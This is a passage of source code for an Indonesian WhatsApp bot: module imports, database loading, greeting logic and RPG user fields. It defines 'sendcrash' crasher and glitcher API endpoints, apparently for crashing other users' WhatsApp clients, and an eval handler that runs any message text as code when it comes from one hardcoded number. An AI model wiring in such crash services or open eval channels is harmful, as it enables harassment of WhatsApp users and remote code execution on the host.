require('./settings.js')
require('./lib/listmenu.js')
const {
	downloadContentFromMessage
} = require('@whiskeysockets/baileys')
const { modul } = require('./module.js')
const { os, axios, baileys, chalk, cheerio, child_process, crypto, cookie, FormData, FileType, fetch, fs, fsx, ffmpeg, jsobfus, PhoneNumber, process, moment, ms, speed, syntaxerror, util, ytdl, googleTTS, nodecron, maker } = modul
const { exec, spawn, execSync } = child_process
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType, generateForwardMessageContent } = baileys
const { clockString, parseMention, formatp, tanggal, getTime, isUrl, sleep, runtime, fetchJson, getBuffer, jsonformat, format, reSize, generateProfilePicture, getRandom } = require('./lib/myfunc.js')
const path = require('path');
const WebSocket = require('ws');
const { FajarNews, BBCNews, metroNews, CNNNews, iNews, KumparanNews, TribunNews, DailyNews, DetikNews, OkezoneNews, CNBCNews, KompasNews, SindoNews, TempoNews, IndozoneNews, AntaraNews, RepublikaNews, VivaNews, KontanNews, MerdekaNews, KomikuSearch, AniPlanetSearch, KomikFoxSearch, KomikStationSearch, MangakuSearch, KiryuuSearch, KissMangaSearch, KlikMangaSearch, PalingMurah, LayarKaca21, AminoApps, Mangatoon, WAModsSearch, Emojis, CoronaInfo, JalanTikusMeme,Cerpen, Quotes, Couples, Darkjokes } = require("dhn-api");
const salam = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
const API_URL = 'http://panel.gtps3.com:3371/stats/gtyn_api.json';
const uploadImage = require('./lib/uploadImage')
const { removeBackgroundFromImageFile } = require('remove.bg')
const dns = require("dns")
const { sizeFormatter } = require("human-readable");
const buyerpermastatus = 'http://panel.gtps3.com:3371/stats/gtbs_api.json';
const { isSetWelcome, addSetWelcome, changeSetWelcome, removeSetWelcome } = require('./lib/setwelcome.js');
const { Primbon } = require('scrape-primbon')
const primbon = new Primbon()
const canvafy = require('canvafy')
const { isSetLeft, addSetLeft, removeSetLeft, changeSetLeft } = require('./lib/setleft.js');
const { getTextSetWelcome } = require('./lib/setwelcome.js');
const { getTextSetLeft } = require('./lib/setleft.js');
const { color, bgcolor } = require('./lib/color.js')
const { TelegraPh } = require('./lib/uploader.js')
const { fetchBuffer, buffermagef } = require("./lib/myfunc2.js")
const { uptotelegra } = require('./scrape/upload.js')
const { Sticker, StickerTypes } = require('wa-sticker-formatter')
const JavaScriptObfuscator = require('javascript-obfuscator');
const fg = require('api-dylux')
const { msgFilter } = require('./lib/antispam.js')
const { ytDonlodMp3, ytDonlodMp4, ytPlayMp3, ytPlayMp4, ytSearch } = require('./scrape/yt.js')
const { y2mateplay, y2matemp3, y2matemp4 } = require('./scrape/y2mate')
const { jadibot } = require('./jadibot.js')
const anon = require('./lib/menfess.js') 
const scp1 = require('./scrape/scraper.js') 
const scp2 = require('./scrape/scraperr.js')
const scp3 = require('./scrape/scraperrr.js')
const githubstalk = require('./scrape/githubstalk.js')
const npmstalk = require('./scrape/npmstalk.js')
const photooxy = require('./scrape/photooxy.js')
const yts = require('./scrape/yt-search/dist/yt-search.js')
const vm = require('node:vm')
const { EmojiAPI } = require("emoji-api")
const stream = require('stream');
const emoji = new EmojiAPI()
const owner = JSON.parse(fs.readFileSync('./database/owner.json'))
const prem = JSON.parse(fs.readFileSync('./database/premium.json'))
const { fetchdataa, buffermagee } = require("./lib/funcc.js")
const dansyaverifikasiuser = JSON.parse(fs.readFileSync('./database/user.json'))
const mikupoxyVoiceNote = JSON.parse(fs.readFileSync('./data/Media/database/xeonvn.json'))
const mikupoxySticker = JSON.parse(fs.readFileSync('./data/Media/database/xeonsticker.json'))
const Imagemikupoxy = JSON.parse(fs.readFileSync('./data/Media/database/xeonimage.json'))
const Videomikupoxy = JSON.parse(fs.readFileSync('./data/Media/database/xeonvideo.json'))
const Badmikupoxy = JSON.parse(fs.readFileSync('./database/bad.json'))
const pler = JSON.parse(fs.readFileSync('./database/idgrup.json').toString())
const siminya = JSON.parse(fs.readFileSync('./database/simi.json'))
const chatmikupoxy = JSON.parse(fs.readFileSync('./database/chatmikupoxy.json'))
const { isSetProses, addSetProses, removeSetProses, changeSetProses, getTextSetProses } = require('./lib/setproses.js');
const { addResponList, delResponList, isAlreadyResponList, isAlreadyResponListGroup, sendResponList, updateResponList, getDataResponList } = require('./lib/respon-list.js');
const { isSetDone, addSetDone, removeSetDone, changeSetDone, getTextSetDone } = require('./lib/setdone.js');
let autosticker = JSON.parse(fs.readFileSync('./database/autosticker.json'))
const jimp = require('jimp');
let mute = JSON.parse(fs.readFileSync('./database/mute.json'));
let ntnsfw = JSON.parse(fs.readFileSync('./database/nsfw.json'))
let ntvirtex = JSON.parse(fs.readFileSync('./database/antivirus.json'))
let _cmd = JSON.parse(fs.readFileSync('./database/command.json'));
let _cmdUser = JSON.parse(fs.readFileSync('./database/commandUser.json'));
let nttoxic = JSON.parse(fs.readFileSync('./database/antitoxic.json'))
let ntwame = JSON.parse(fs.readFileSync('./database/antiwame.json'))
let ntlinkgc =JSON.parse(fs.readFileSync('./database/antilinkgc.json'))
let ntilinkall =JSON.parse(fs.readFileSync('./database/antilinkall.json'))
let ntilinktwt =JSON.parse(fs.readFileSync('./database/antilinktwitter.json'))
let ntilinktt =JSON.parse(fs.readFileSync('./database/antilinktiktok.json'))
let ntilinktg =JSON.parse(fs.readFileSync('./database/antilinktelegram.json'))
let ntilinkfb =JSON.parse(fs.readFileSync('./database/antilinkfacebook.json'))
let ntilinkig =JSON.parse(fs.readFileSync('./database/antilinkinstagram.json'))
let ntilinkytch =JSON.parse(fs.readFileSync('./database/antilinkytchannel.json'))
let ntilinkytvid =JSON.parse(fs.readFileSync('./database/antilinkytvideo.json'))
let openaigc = JSON.parse(fs.readFileSync('./database/openaigc.json'))
let set_welcome_db = JSON.parse(fs.readFileSync('./database/set_welcome.json'));
let set_left_db = JSON.parse(fs.readFileSync('./database/set_left.json'));
let _welcome = JSON.parse(fs.readFileSync('./database/welcome.json'))
let _left = JSON.parse(fs.readFileSync('./database/left.json'))
let set_proses = JSON.parse(fs.readFileSync('./database/set_proses.json'))
let set_done = JSON.parse(fs.readFileSync('./database/set_done.json'))
let db_respon_list = JSON.parse(fs.readFileSync('./database/list-message.json'));
global.db = JSON.parse(fs.readFileSync('./database/database.json'))
if (global.db) global.db = {
sticker: {},
database: {}, 
game: {},
others: {},
users: {},
chats: {},
settings: {},
...(global.db || {})
}

// read database
let tebaklagu = []
let lastHidetagTime = {};
let _family100 = []
let kuismath = []
let tebakgambar = []
let tebakkata = []
let transactionDetails = {};
let caklontong = []
let caklontong_desk = []
let tebakkalimat = []
let tebaklirik = []
let tebaktebakan = []
let tebakbendera = []
let tebakbendera2 = []
let tebakkabupaten = []
let tebakkimia = []
let tebakasahotak = []
let tebaksiapakahaku = []
let tebaksusunkata = []
let tebaktekateki = []
let vote = db.others.vote = []

let formatt = sizeFormatter({
std: "JEDEC", // 'SI' (default) | 'IEC' | 'JEDEC'
decimalPlaces: 2,
keepTrailingZeroes: false,
render: (literal, symbol) => `${literal} ${symbol}B`,
});

async function checkBandwidth() {
let ind = 0;
let out = 0;
for (let i of await require("node-os-utils").netstat.stats()) {
ind += parseInt(i.inputBytes);
out += parseInt(i.outputBytes);
}
return {
download: formatt(ind),
upload: formatt(out),
};
}

const nodeToRegion = {
    ae1: 'United Arab Emirates',
    bg1: 'Bulgaria',
    br1: 'Brazil',
    ch1: 'Switzerland',
    cz1: 'Czech Republic',
    de1: 'Germany',
    de4: 'Germany',
    es1: 'Spain',
    fi1: 'Finland',
    fr2: 'France',
    hk1: 'Hong Kong',
    hr1: 'Croatia',
    il1: 'Israel',
    il2: 'Israel',
    in1: 'India',
    ir1: 'Iran',
    ir3: 'Iran',
    ir5: 'Iran',
    it2: 'Italy',
    jp1: 'Japan',
    kz1: 'Kazakhstan',
    lt1: 'Lithuania',
    md1: 'Moldova',
    nl1: 'Netherlands',
    nl2: 'Netherlands',
    pl1: 'Poland',
    pl2: 'Poland',
    pt1: 'Portugal',
    rs1: 'Serbia',
    ru1: 'Russia',
    ru2: 'Russia',
    ru3: 'Russia',
    se1: 'Sweden',
    tr1: 'Turkey',
    tr2: 'Turkey',
    ua1: 'Ukraine',
    ua2: 'Ukraine',
    ua3: 'Ukraine',
    uk1: 'United Kingdom',
    us1: 'United States',
    us2: 'United States',
    us3: 'United States'
};

async function dellCase(filePath, caseNameToRemove) {
    fs.readFile(filePath, 'utf8', (err, data) => {
        if (err) {
            reply('Terjadi kesalahan:', err);
            return;
        }

        const regex = new RegExp(`case\\s+'${caseNameToRemove}':[\\s\\S]*?break`, 'g');
        const modifiedData = data.replace(regex, '');

        fs.writeFile(filePath, modifiedData, 'utf8', (err) => {
            if (err) {
                console.error('Terjadi kesalahan saat menulis file:', err);
                return;
            }

            reply(`Teks dari case '${caseNameToRemove}' telah dihapus dari file.`);
        });
    });
}

const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
        const wib = moment.tz('Asia/Jakarta').format('HH : mm :ss')
        const wit = moment.tz('Asia/Jayapura').format('HH : mm : ss')
        const wita = moment.tz('Asia/Makassar').format('HH : mm : ss')

async function fetchApiData() {
    try {
        const fetch = (await import('node-fetch')).default;
        const response = await fetch(API_URL);
        if (response.ok) {
            return await response.json();
        } else {
            console.log(`Failed to fetch API data. Status Code: ${response.status}`);
        }
    } catch (error) {
        console.log(`Error fetching data: ${error}`);
    }
    return null;
}

async function gtbs() {
    try {
        const fetch = (await import('node-fetch')).default;
        const response = await fetch(buyerpermastatus);
        if (response.ok) {
            return await response.json();
        } else {
            console.log(`Failed to fetch API data. Status Code: ${response.status}`);
        }
    } catch (error) {
        console.log(`Error fetching data: ${error}`);
    }
    return null;
}
 
async function fetchApiData2(url) {
    try {
        // Send an HTTP request to the specified URL
        const response = await fetch(url, {
            method: 'GET', // Assuming GET method; adjust if needed
            headers: {
                'Content-Type': 'application/json'
                // Add other headers if required by the API
            }
        });

        // Check if the response status is OK (2xx)
        if (!response.ok) {
            console.error(`Error: Request to ${url} failed with status ${response.status}`);
            return false;
        }

        // Parse the response body as JSON
        const data = await response.json();

        // Assume the API returns a success flag or similar
        // Adjust this check based on the actual response format
        if (data.success || data.status === 'success' || data.message === 'Success') {
            return true;
        } else {
            console.error(`Error: API response not successful - ${data.message || 'Unknown error'}`);
            return false;
        }
    } catch (error) {
        // Log any network or parsing errors
        console.error(`Fetch API data error: ${error.message}`);
        return false;
    }
}
const CRASHER_API_URL = 'https://aphridate.site/i/sendcrash';
const GLITCHER_API_URL = 'http://glitchwatools-apis.online/sendCrash';

// Daftar blacklist langsung di dalam kode
let blacklist = ['6281234567890', '6289876543210']; // Tambahkan nomor lain sesuai kebutuhan


module.exports = mikupoxy = async (mikupoxy, m, chatUpdate, store) => {
try {
        const { type, quotedMsg, mentioned, now, fromMe } = m
        const body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : '.'
const bady = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == 'interactiveResponseMessage') ? appenTextMessage(JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id, chatUpdate) : (m.mtype == 'templateButtonReplyMessage') ? appenTextMessage(m.msg.selectedId, chatUpdate) : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ' '

const budy = (typeof m.text == 'string' ? m.text : '')
        //prefix 1
 const prefix = /[\uD800-\uDBFF][\uDC00-\uDFFF]/gi.test(body) ? body.match(/[\uD800-\uDBFF][\uDC00-\uDFFF]/gi)[0] : /^[.]/gi.test(body) ? body.match(/^[.]/gi)[0] : '.'
async function appenTextMessage(text, chatUpdate) {
let messages = await generateWAMessage(m.chat, { text: text, mentions: m.mentionedJid }, {
userJid: mikupoxy.user.id,
quoted: m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, mikupoxy.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
...chatUpdate,
messages: [proto.WebMessageInfo.fromObject(messages)],
type: 'append'
}
mikupoxy.ev.emit('messages.upsert', msg)
}


async function getOnlineMembers(groupId) {
    try {
        // Mengambil metadata grup
        const group = await mikupoxy.groupMetadata(groupId);
        const members = group.participants;

        // Memfilter anggota yang online
        const onlineMembers = members.filter(member => member.isOnline);
        const onlineNames = onlineMembers.map(member => member.notify || member.id); // Mendapatkan nama anggota yang online

        return onlineNames;
    } catch (error) {
        console.error("Error getting online members: ", error);
        return [];
    }
}
         
        const chath = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'documentMessage') && m.message.documentMessage.caption ? m.message.documentMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'templateButtonReplyMessage') && m.message.templateButtonReplyMessage.selectedId ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == "listResponseMessage") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == "messageContextInfo") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : '.'
        const pes = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text: ' '
        const messagesC = pes.slice(0).trim()
        const content = JSON.stringify(m.message)
        const isCmd = body.startsWith(prefix)
        const from = m.key.remoteJid
        const messagesD = body.slice(0).trim().split(/ +/).shift().toLowerCase()
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const pushname = m.pushName || "No Name"
        const botNumber = await mikupoxy.decodeJid(mikupoxy.user.id)
        const isOwner = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender);
        const text = q = args.join(" ")
        const quoted = m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
        const qmsg = (quoted.msg || quoted)
        const isMedia = /image|video|sticker|audio/.test(mime)
        const isImage = (type == 'imageMessage')
		const isVideo = (type == 'videoMessage')
		const isAudio = (type == 'audioMessage')
		const isSticker = (type == 'stickerMessage')
		const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
		const isQuotedViewOnce = type === 'extendedTextMessage' && content.includes('viewOnceMessageV2')
        const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
        const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
        const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
        const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
        const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')
        const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
        const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
        const senderNumber = sender.split('@')[0]
        const groupMetadata = m.isGroup ? await mikupoxy.groupMetadata(m.chat).catch(e => {}) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
        const groupOwner = m.isGroup ? groupMetadata.owner : ''
        const groupMembers = m.isGroup ? groupMetadata.participants : ''
    	const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
        const isGroupAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
    	const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
     const jangan = m.isGroup ? pler.includes(m.chat) : false
    	const isPrem = prem.includes(m.sender)
    	const isUser = dansyaverifikasiuser.includes(sender)
    	const mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
    	const mentionByTag = type == 'extendedTextMessage' && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.mentionedJid : []
        const mentionByReply = type == 'extendedTextMessage' && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.participant || '' : ''
        const numberQuery = q.replace(new RegExp('[()+-/ +/]', 'gi'), '') + '@s.whatsapp.net'
        const usernya = mentionByReply ? mentionByReply : mentionByTag[0]
        const Input = mentionByTag[0] ? mentionByTag[0] : mentionByReply ? mentionByReply : q ? numberQuery : false
    	const isEval = body.startsWith('=>')
      const isAutoAiGc = m.isGroup ? openaigc.includes(m.chat) : true
      const ismikupoxychat = m.isGroup ? chatmikupoxy.includes(m.chat) : true
      const shouldExit = true
      const automati = false
      const urlPattern = /(?:https?:\/\/)?(?:www\.)?[a-z0-9]+\.[a-z]{2,}(:[0-9]{1,5})?(\/[^\s]*)?/gi;
      const waMePattern = /wa\.me\/[0-9]+/gi;
      const isAutosimi = m.isGroup ? siminya.includes(m.chat) : true
        const AntiNsfw = m.isGroup ? ntnsfw.includes(from) : false
        const isAutoSticker = m.isGroup ? autosticker.includes(from) : false
        const antiVirtex = m.isGroup ? ntvirtex.includes(from) : true
        const Antilinkgc = m.isGroup ? ntlinkgc.includes(m.chat) : false
        const antibot = true
        const AntiLinkYoutubeVid = m.isGroup ? ntilinkytvid.includes(from) : false
        const AntiLinkYoutubeChannel = m.isGroup ? ntilinkytch.includes(from) : false
        const isMute= mute.includes(m.chat) ? true : false
        const AntiLinkInstagram = m.isGroup ? ntilinkig.includes(from) : false
        const AntiLinkFacebook = m.isGroup ? ntilinkfb.includes(from) : false
        const AntiLinkTiktok = m.isGroup ? ntilinktt.includes(from) : false
        const AntiLinkTelegram = m.isGroup ? ntilinktg.includes(from) : false
        const AntiLinkTwitter = m.isGroup ? ntilinktwt.includes(from) : false
        const AntiLinkAll = m.isGroup ? ntilinkall.includes(from) : false
        const antiWame = m.isGroup ? ntwame.includes(from) : false
        const antiToxic = m.isGroup ? nttoxic.includes(from) : true
const isWelcome = _welcome.includes(m.chat) ? true : false
const isLeft = _left.includes(m.chat) ? true : false
const isSimi = siminya.includes(m.chat) ? true : false 
const mikupoxytotalpitur = () =>{
            var mytext = fs.readFileSync("./Case.js").toString()
            var numUpper = (mytext.match(/case '/g) || []).length
            return numUpper
        }
        const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
        const xdate = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
        const time2 = moment.tz('Asia/Jakarta').format('HH : mm : ss')
        const wit = moment.tz('Asia/Jayapura').format('HH : mm : ss')
        const wita = moment.tz('Asia/Makassar').format('HH : mm : ss')
         if(time2 < "23:59:00"){
var mikupoxyliatwaktu = `Selamat Malam 🌌`
 }
 if(time2 < "19:00:00"){
var mikupoxyliatwaktu = `Selamat Malam 🌃`
 }
 if(time2 < "18:00:00"){
var mikupoxyliatwaktu = `Selamat Malam 🌃`
 }
 if(time2 < "15:00:00"){
var mikupoxyliatwaktu = `Selamat Sore 🌅`
 }
 if(time2 < "11:00:00"){
var mikupoxyliatwaktu = `Selamat pagi 🌄`
 }
 if(time2 < "05:00:00"){
var mikupoxyliatwaktu = `Selamat Pagi 🌄`
 } 

let dt = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
var fildt = dt == 'pagi' ? dt + '🌝' : dt == 'siang' ? dt + '🌞' : dt == 'sore' ? dt + '🌝' : dt + '🌚'
const ucapanWaktu = fildt.charAt(0).toUpperCase() + fildt.slice(1)

		if (isEval && senderNumber == "+6281111111111") {
			let evaled,
				text = q,
				{ inspect } = require('util')
			try {
				if (text.endsWith('--sync')) {
					evaled = await eval(
						`(async () => { ${text.trim.replace('--sync', '')} })`
					)
					reply(evaled)
				}
				evaled = await eval(text)
				if (typeof evaled !== 'string') evaled = inspect(evaled)
				await mikupoxy.sendMessage(from, { text: evaled }, { quoted: m })
			} catch (e) {
				mikupoxy.sendMessage(from, { text: String(e) }, { quoted: m })
			}
		}
try {
const isNumber = x => typeof x === 'number' && !isNaN(x)
const user = global.db.users[m.sender]
if (typeof user !== 'object') global.db.users[m.sender] = {}
const chats = global.db.chats[m.chat]
if (typeof chats !== 'object') global.db.chats[m.chat] = {

}
if (user) {
if (!isNumber(user.chip)) user.chip = 0
if (!isNumber(user.atm)) user.atm = 0
if (!isNumber(user.fullatm)) user.fullatm = 0
if (!isNumber(user.bank)) user.bank = 0
if (!isNumber(user.health)) user.health = 100
if (!isNumber(user.potion)) user.potion = 0
if (!isNumber(user.trash)) user.trash = 0
if (!isNumber(user.wood)) user.wood = 0
if (!isNumber(user.rock)) user.rock = 0
if (!isNumber(user.string)) user.string = 0
if (!isNumber(user.petfood)) user.petfood = 0
if (!isNumber(user.emerald)) user.emerald = 0
if (!isNumber(user.diamond)) user.diamond = 0
if (!isNumber(user.gold)) user.gold = 0
if (!isNumber(user.botol)) user.botol = 0
if (!isNumber(user.kardus)) user.kardus = 0
if (!isNumber(user.kaleng)) user.kaleng = 0
if (!isNumber(user.gelas)) user.gelas = 0
if (!isNumber(user.plastik)) user.plastik = 0
if (!isNumber(user.iron)) user.iron = 0
if (!isNumber(user.common)) user.common = 0
if (!isNumber(user.uncommon)) user.uncommon = 0
if (!isNumber(user.mythic)) user.mythic = 0
if (!isNumber(user.legendary)) user.legendary = 0
if (!isNumber(user.umpan)) user.umpan = 0
if (!isNumber(user.pet)) user.pet = 0
if (!isNumber(user.paus)) user.paus = 0
if (!isNumber(user.kepiting)) user.kepiting = 0
if (!isNumber(user.gurita)) user.gurita = 0
if (!isNumber(user.cumi)) user.cumi = 0
if (!isNumber(user.buntal)) user.buntal = 0
if (!isNumber(user.dory)) user.dory = 0
if (!isNumber(user.lumba)) user.lumba = 0
if (!isNumber(user.lobster)) user.lobster = 0
if (!isNumber(user.hiu)) user.hiu = 0
if (!isNumber(user.udang)) user.udang = 0
if (!isNumber(user.orca)) user.orca = 0
if (!isNumber(user.banteng)) user.banteng = 0
if (!isNumber(user.gajah)) user.gajah = 0
if (!isNumber(user.harimau)) user.harimau = 0
if (!isNumber(user.kambing)) user.kambing = 0
if (!isNumber(user.panda)) user.panda = 0
if (!isNumber(user.buaya)) user.buaya = 0
if (!isNumber(user.kerbau)) user.kerbau = 0
if (!isNumber(user.sapi)) user.sapi = 0
if (!isNumber(user.monyet)) user.monyet = 0
if (!isNumber(user.babihutan)) user.babihutan = 0
if (!isNumber(user.babi)) user.babi = 0
if (!isNumber(user.ayam)) user.ayam = 0

if (!isNumber(user.lastadventure)) user.lastadventure = 0
if (!isNumber(user.lastkill)) user.lastkill = 0
if (!isNumber(user.lastmisi)) user.lastmisi = 0
if (!isNumber(user.lastdungeon)) user.lastdungeon = 0
if (!isNumber(user.lastwar)) user.lastwar = 0
if (!isNumber(user.lastsda)) user.lastsda = 0
if (!isNumber(user.lastduel)) user.lastduel = 0
if (!isNumber(user.lastmining)) user.lastmining = 0
if (!isNumber(user.lasthunt)) user.lasthunt = 0
if (!isNumber(user.lastgift)) user.lastgift = 0
if (!isNumber(user.lastberkebon)) user.lastberkebon = 0
if (!isNumber(user.lastdagang)) user.lastdagang = 0
if (!isNumber(user.lasthourly)) user.lasthourly = 0
if (!isNumber(user.lastbansos)) user.lastbansos = 0
if (!isNumber(user.lastrampok)) user.lastrampok = 0
if (!isNumber(user.lastclaim)) user.lastclaim = 0
if (!isNumber(user.lastnebang)) user.lastnebang = 0
if (!isNumber(user.lastweekly)) user.lastweekly = 0
if (!isNumber(user.lastmonthly)) user.lastmonthly = 0
if (!isNumber(user.apel)) user.apel = 0
if (!isNumber(user.anggur)) user.anggur = 0
if (!isNumber(user.jeruk)) user.jeruk = 0
if (!isNumber(user.mangga)) user.mangga = 0
if (!isNumber(user.pisang)) user.pisang = 0
if (!isNumber(user.makanan)) user.makanan = 0
if (!isNumber(user.bibitanggur)) user.bibitanggur = 0
if (!isNumber(user.bibitpisang)) user.bibitpisang = 0
if (!isNumber(user.bibitapel)) user.bibitapel = 0
if (!isNumber(user.bibitmangga)) user.bibitmangga = 0
if (!isNumber(user.bibitjeruk)) user.bibitjeruk = 0
if (!isNumber(user.horse)) user.horse = 0
if (!isNumber(user.horseexp)) user.horseexp = 0
if (!isNumber(user.cat)) user.cat = 0
if (!isNumber(user.catexp)) user.catexp = 0
if (!isNumber(user.fox)) user.fox = 0
if (!isNumber(user.foxhexp)) user.foxexp = 0
if (!isNumber(user.dog)) user.foxexp = 0
if (!isNumber(user.dogexp)) user.dogexp = 0
if (!isNumber(user.robo)) user.robo = 0
if (!isNumber(user.roboexp)) user.roboexp = 0
if (!isNumber(user.horselastfeed)) user.horselastfeed = 0
if (!isNumber(user.catlastfeed)) user.catlastfeed = 0
if (!isNumber(user.robolastfeed)) user.robolastfeed = 0
if (!isNumber(user.foxlastfeed)) user.foxlastfeed = 0
if (!isNumber(user.doglastfeed)) user.doglastfeed = 0
if (!isNumber(user.robo)) user.robo = 0
if (!isNumber(user.robodurability)) user.robodurability = 0
if (!isNumber(user.armor)) user.armor = 0
if (!isNumber(user.armordurability)) user.armordurability = 0
if (!isNumber(user.sword)) user.sword = 0
if (!isNumber(user.sworddurability)) user.sworddurability = 0
if (!isNumber(user.pickaxe)) user.pickaxe = 0
if (!isNumber(user.pickaxedurability)) user.pickaxedurability = 0
if (!isNumber(user.fishingrod)) user.fishingrod = 0
if (!isNumber(user.fishingroddurability)) user.fishingroddurability = 0
if (!user.premium) user.premiumTime = 0
if (!('afkReason' in user)) user.afkReason = ''
if (!("premium" in user)) user.premium = false
} else global.db.users[m.sender] = {
afkTime: -1,
afkReason: '',
premiumTime: 0,
premium: false,
money: 100000,
exp: 0,
limit: 30,
freelimit: 0,
lastclaim: 0,
skata: 0,
registered: false,
name: m.name,
pc: 0,
joinlimit: 1,
age: -1,
regTime: -1,
unreg: false,
afk: -1,
afkReason: '',
banned: false,
bannedTime: 0,
warning: 0,
level: 0,
rokets: 0,
role: 'Beginner',
skill: '',
ojekk: 0,
WarnReason: '',
chip: 0,
bank: 0,
atm: 0,
fullatm: 0,
health: 100,
potion: 10,
trash: 0,
wood: 0,
rock: 0,
string: 0,
emerald: 0,
diamond: 0,
gold: 0,
iron: 0,
common: 0,
uncommon: 0,
mythic: 0,
legendary: 0,
umpan: 0,
pet: 0,
horse: 0,
horseexp: 0,
horselastfeed: 0,
cat: 0,
catexp: 0,
catlastfeed: 0,
fox: 0,
foxexp: 0,
foxlastfeed: 0,
robo: 0,
roboexp: 0,
robolastfeed: 0,
dog: 0,
dogexp: 0,
doglastfeed: 0,
paus: 0,
kepiting: 0,
gurita: 0,
cumi: 0,
buntal: 0,
dory: 0,
lumba: 0,
lobster: 0,
hiu: 0,
udang: 0,
ikan: 0,
orca: 0,
banteng: 0,
harimau: 0,
gajah: 0,
kambing: 0,
buaya: 0,
kerbau: 0,
sapi: 0,
monyet: 0,
babi: 0,
ayam: 0,
armor: 0,
armordurability: 0,
sword: 0,
sworddurability: 0,
pickaxe: 0,
pickaxedurability: 0,
fishingrod: 0,
fishingroddurability: 0,
robo: 0,
robodurability: 0,
apel: 20,
pisang: 0,
anggur: 0,
mangga: 0,
jeruk: 0,
lastadventure: 0,
lastkill: 0,
lastmisi: 0,
lastdungeon: 0,
lastwar: 0,
lastsda: 0,
lastduel: 0,
lastmining: 0,
lasthunt: 0,
lastgift: 0,
lastberkebon: 0,
lastdagang: 0,
lasthourly: 0,
lastbansos: 0,
lastrampok: 0,
lastclaim: 0,
lastnebang: 0,
lastweekly: 0,
lastmonthly: 0

}



const setting = db.settings[botNumber]
        if (typeof setting !== 'object') db.settings[botNumber] = {}
	    if (setting) {
    	    if (!('anticall' in setting)) setting.anticall = false
    		if (!isNumber(setting.status)) setting.status = 0
    		if (!('autobio' in setting)) setting.autobio = false
    	    if (!('autoclearsession' in setting)) setting.autoclearsession = false
        if (!('goodbye' in setting)) chats.goodbye = setting.auto_leaveMsg
        if (!('onlygrub' in setting)) setting.onlygrub = false
        if (!('onlypc' in setting)) setting.onlypc = false
        if (!('welcome' in setting)) chats.welcome = setting.auto_welcomeMsg
       if (!('onlygrub' in setting)) setting.onlygrub = false
	  } else global.db.settings[botNumber] = {
    	  anticall: false,
    		status: 0,
